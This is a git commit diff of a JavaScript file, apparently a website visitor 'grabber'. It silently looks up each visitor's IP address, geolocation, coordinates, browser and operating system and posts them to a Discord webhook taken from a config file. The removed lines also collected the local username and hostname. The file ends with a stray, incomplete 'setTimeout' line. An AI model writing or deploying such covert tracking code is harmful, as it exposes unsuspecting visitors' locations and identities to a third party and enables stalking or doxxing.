8a42f34cc558754c5e626aba45adb9430668f7f6
msuengineer//profile <157277669+1234567890291@users.noreply.github.com>
2024-06-04 22:41:47 +0500

    Add files via upload

--- main.js
+++ main.js
@@ -1,22 +1,24 @@
-const fetch = require('node-fetch');
-const os = require('os');
-
 const grabData = async () => {
-    // Fetch webhook token from config.json
+
+    //fetch webhook token from config.json
     await fetch("./config.json").then((response) => {
-        // Return value of config.json
+
+        //return value of config.json
         return response.json().then(function (data) {
-            // Save it to a new variable
+
+            //save it to new Variable
             var dataExport = data;
-            // Export Token
+
+            //Export Token
             var Webhook = dataExport.Token;
 
             const request = async () => {
+
                 // Calling synchronous fetch
                 const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + dataExport.key);
                 const user = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + dataExport.key);
 
-                // Waiting for response
+                //waiting for response
                 const data = await response.json();
                 const AgentData = await user.json();
 
@@ -34,38 +36,30 @@ const grabData = async () => {
                 const flag = data.country_flag;
                 const currency = data.currency.name;
                 const currentDate = new Date();
-
+                
                 // Declaring Some variables For 'agent'
                 const broname = AgentData.name + '/' + AgentData.type;
                 const engine = AgentData.engine.name + '(' + AgentData.engine.versionMajor + ')';
-                const op = AgentData.operatingSystem.name + " " + AgentData.operatingSystem.versionMajor;
-
-                // Get system information
-                const username = os.userInfo().username;
-                const pcName = os.hostname();
-
-                // Extract browser details from user agent
-                const userAgent = AgentData.userAgent;
-                const browserDetails = userAgent.split('(')[1].split(')')[0];
+                const op = AgentData.operatingSystem.name + " " +AgentData.operatingSystem.versionMajor;
 
                 // Open XMLHttpRequest POST Request
                 const postRequest = new XMLHttpRequest();
                 postRequest.open("POST", Webhook);
                 postRequest.setRequestHeader("Content-type", "application/json");
 
-                // Creating Discord Webhook
+                //Creating Discord Webhook
                 const params = {
-                    username: "Website Visited From " + country + "/" + city + " - " + username + " on " + pcName,
+                    username: "Website Visited From "+ country + "/" + city,
                     avatar_url: 'https://cdn-icons-png.flaticon.com/512/7013/7013144.png',
                     content: null,
                     embeds: [
                         {
-                            title: "** ** ** **:globe_with_meridians: IP Address: " + ip,
-                            "url": "https://whatismyipaddress.com/ip/" + ip,
+                            title: "** ** ** **:globe_with_meridians: IP Adress: " + ip,
+                            "url": "https://whatismyipaddress.com/ip/"+ ip,
                             description: "** **",
                             "thumbnail": {
                                 "url": flag
-                            },
+                              },
                             color: 1993898,
                             fields: [
                                 {
@@ -80,17 +74,17 @@ const grabData = async () => {
                                 },
                                 {
                                     name: ":round_pushpin: Location: ",
-                                    value: "Longitude: " + lon + "\n" + "Latitude: " + lat + "\n" + "Google Map: [Click](https://www.google.com/maps/@" + lat + "," + lon + ",6z)",
+                                    value: "Longitude: " + lon + "\n" + "Latitude: " + lat +"\n"+"Google Map: [Click](https://www.google.com/maps/@"+lat+","+lon+",6z)",
                                     inline: true,
                                 },
                                 {
                                     name: ":bust_in_silhouette: Client info: ",
-                                    value: ":satellite: Browser: " + broname + "\n" + ":gear: Engine: " + engine + "\n" + ":computer: OS: " + op + "\n",
+                                    value: ":satellite: Browser: "+ broname + "\n"+ ":gear: Engine: "+ engine +"\n"+ ":computer: OS: "+op+"\n",
                                     inline: true,
                                 },
                                 {
                                     name: ":incoming_envelope: Extra info: ",
-                                    value: ":calling: Call Code: (" + callcode + ")\n" + ":speaking_head: Lang's: " + languages + "\n" + ":coin: Currency: " + currency,
+                                    value: ":calling: Call Code: ("+ callcode +")\n"+ ":speaking_head: Lang's: "+languages+"\n"+":coin: Currency: "+ currency,
                                     inline: true,
                                 },
                             ],
@@ -103,7 +97,7 @@ const grabData = async () => {
                     ],
                 };
 
-                // Send Webhook
+                //Send Webhook
                 postRequest.send(JSON.stringify(params));
             };
 
@@ -115,3 +109,4 @@ const grabData = async () => {
 
 // Start App
 grabData();
+setTimeout
